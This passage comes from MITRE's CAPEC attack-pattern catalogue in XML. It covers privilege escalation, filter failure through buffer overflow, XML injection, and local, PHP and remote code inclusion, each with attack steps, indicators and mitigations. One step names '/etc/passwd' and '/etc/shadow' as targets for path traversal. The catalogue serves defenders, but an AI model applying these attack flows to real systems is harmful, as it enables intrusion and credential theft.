            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Alternate_Terms, Description, Execution_Flow, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, Description, Execution_Flow, Indicators, Mitigations, Prerequisites</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Notes</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-07-30">XML Oversized Payloads</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="233" Name="Privilege Escalation" Abstraction="Meta" Status="Draft">
         <ns0:Description>An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.</ns0:Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="269" />
            <ns0:Related_Weakness CWE_ID="1264" />
            <ns0:Related_Weakness CWE_ID="1311" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1548</ns0:Entry_ID>
               <ns0:Entry_Name>Abuse Elevation Control Mechanism</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-600" Section="Testing for Privelege Escalation" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Description Summary, Relationships, Type (Category -&gt; Attack_Pattern)</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References, Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Abstraction</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Abstraction</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="24" Name="Filter Failure through Buffer Overflow" Abstraction="Detailed" Status="Draft">
         <ns0:Description>In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey] The attacker surveys the target application, possibly as a valid and authenticated user</ns0:Description>
               <ns0:Technique>Spidering web sites for inputs that involve potential filtering</ns0:Technique>
               <ns0:Technique>Brute force guessing of filtered inputs</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Attempt injections] Try to feed overly long data to the system. This can be done manually or a dynamic tool (black box) can be used to automate this. An attacker can also use a custom script for that purpose.</ns0:Description>
               <ns0:Technique>Brute force attack through black box penetration test tool.</ns0:Technique>
               <ns0:Technique>Fuzzing of communications protocols</ns0:Technique>
               <ns0:Technique>Manual testing of possible inputs with attack data.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Monitor responses] Watch for any indication of failure occurring. Carefully watch to see what happened when filter failure occurred. Did the data get in?</ns0:Description>
               <ns0:Technique>Boron tagging. Choose clear attack inputs that are easy to notice in output. In binary this is often 0xa5a5a5a5 (alternating 1s and 0s). Another obvious tag value is all zeroes, but it is not always obvious what goes wrong if the null values get into the data.</ns0:Technique>
               <ns0:Technique>Check Log files. An attacker with access to log files can look at the outcome of bad input.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Abuse the system through filter failure] An attacker writes a script to consistently induce the filter failure.</ns0:Description>
               <ns0:Technique>DoS through filter failure. The attacker causes the system to crash or stay down because of its failure to filter properly.</ns0:Technique>
               <ns0:Technique>Malicious code execution. An attacker introduces a malicious payload and executes arbitrary code on the target system.</ns0:Technique>
               <ns0:Technique>An attacker can use the filter failure to introduce malicious data into the system and leverage a subsequent SQL injection, Cross Site Scripting, Command Injection or similar weakness if it exists.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Ability to control the length of data passed to an active filter.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.</ns0:Skill>
            <ns0:Skill Level="High">Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Indicators>
            <ns0:Indicator>Many exceptions are thrown by the application's filter modules in a short period of time. Check the logs. See if the probes are coming from the same IP address.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.</ns0:Mitigation>
            <ns0:Mitigation>Pre-design: Use a language or compiler that performs automatic bounds checking.</ns0:Mitigation>
            <ns0:Mitigation>Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.</ns0:Mitigation>
            <ns0:Mitigation>Operational: Use OS-level preventative functionality. Not a complete solution.</ns0:Mitigation>
            <ns0:Mitigation>Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack.</html:p>
            </ns0:Example>
            <ns0:Example>A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.</ns0:Example>
            <ns0:Example>Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="120" />
            <ns0:Related_Weakness CWE_ID="119" />
            <ns0:Related_Weakness CWE_ID="118" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="680" />
            <ns0:Related_Weakness CWE_ID="733" />
            <ns0:Related_Weakness CWE_ID="697" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="250" Name="XML Injection" Abstraction="Standard" Status="Draft">
         <ns0:Description>An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="248" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the Target] Using a browser or an automated tool, an adversary records all instances of user-controllable input used to contruct XML queries</ns0:Description>
               <ns0:Technique>Use an automated tool to record all instances of user-controllable input used to contruct XML queries.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how the application processes inputs.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Determine the Structure of Queries] Using manual or automated means, test inputs found for XML weaknesses.</ns0:Description>
               <ns0:Technique>Use XML reserved characters or words, possibly with other input data to attempt to cause unexpected results and identify improper input validation.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Inject Content into XML Queries] Craft malicious content containing XML expressions that is not validated by the application and is executed as part of the XML queries.</ns0:Description>
               <ns0:Technique>Use the crafted input to execute unexpected queries that can disclose sensitive database information to the attacker.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>XML queries used to process user input and retrieve information stored in XML documents</ns0:Prerequisite>
            <ns0:Prerequisite>User-controllable input not properly sanitized</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">An attacker must have knowledge of XML syntax and constructs in order to successfully leverage XML Injection</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Indicators>
            <ns0:Indicator>Too many exceptions generated by the application as a result of malformed queries</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query.</ns0:Mitigation>
            <ns0:Mitigation>Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="91" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="707" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>23</ns0:Entry_ID>
               <ns0:Entry_Name>XML Injection</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References, Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="251" Name="Local Code Inclusion" Abstraction="Standard" Status="Stable">
         <ns0:Description>The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.</ns0:Description>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="175" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture.</ns0:Prerequisite>
            <ns0:Prerequisite>Some variants of this attack may require that old versions of some code files be present and in predictable locations.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>The adversary needs to have enough access to the target application to control the identity of a locally included file. The attacker may also need to be able to upload arbitrary code files to the target machine, although any location for these files may be acceptable.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Through local code inclusion, the adversary compromises the integrity of the application.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
               <ns0:Note>An attacker may leverage local code inclusion in order to print sensitive data to a page, such as hidden configuration files or or password hashes.</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Implementation: Avoid passing user input to filesystem or framework API. If necessary to do so, implement a specific, allowlist approach.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="829" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1055</ns0:Entry_ID>
               <ns0:Entry_Name>Process Injection</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-613" Section="Testing for Local File Inclusion" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Resources_Required, Solutions_and_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="252" Name="PHP Local File Inclusion" Abstraction="Detailed" Status="Draft">
         <ns0:Description>The attacker loads and executes an arbitrary local PHP file on a target machine. The attacker could use this to try to load old versions of PHP files that have known vulnerabilities, to load PHP files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.</ns0:Description>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="251" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey application] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they find. The adversary is looking for URLs that show PHP file inclusion is used, which can look something like "http://vulnerable-website/file.php?file=index.php".</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Attempt variations on input parameters] Once the adversary finds a vulnerable URL that takes file input, they attempt a variety of path traversal techniques to attempt to get the application to display the contents of a local file, or execute a different PHP file already stored locally on the server.</ns0:Description>
               <ns0:Technique>Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of path traversal techniques used to include well known files.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record results of manual input of local file inclusion probes in known URLs.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Include desired local file] Once the adversary has determined which techniques of path traversal successfully work with the vulnerable PHP application, they will target a specific local file to include. These can be files such as "/etc/passwd", "/etc/shadow", or configuration files for the application that might expose sensitive information.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The targeted PHP application must have a bug that allows an attacker to control which code file is loaded at some juncture.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>The attacker needs to have enough access to the target application to control the identity of a locally included PHP file.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="829" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-621" Section="PHP File Inclusion" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="253" Name="Remote Code Inclusion" Abstraction="Standard" Status="Draft">
         <ns0:Description>The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load malicious files that the attacker placed on the remote machine, or to otherwise change the functionality of the targeted application in unexpected ways.</ns0:Description>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="175" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="664" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Target application server must allow remote files to be included.The malicious file must be placed on the remote machine previously.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Mitigations>
            <ns0:Mitigation>Minimize attacks by input validation and sanitization of any user data that will be used by the target application to locate a remote file to be included.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="829" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>05</ns0:Entry_ID>
               <ns0:Entry_Name>Remote File Inclusion</ns0:Entry_Name>
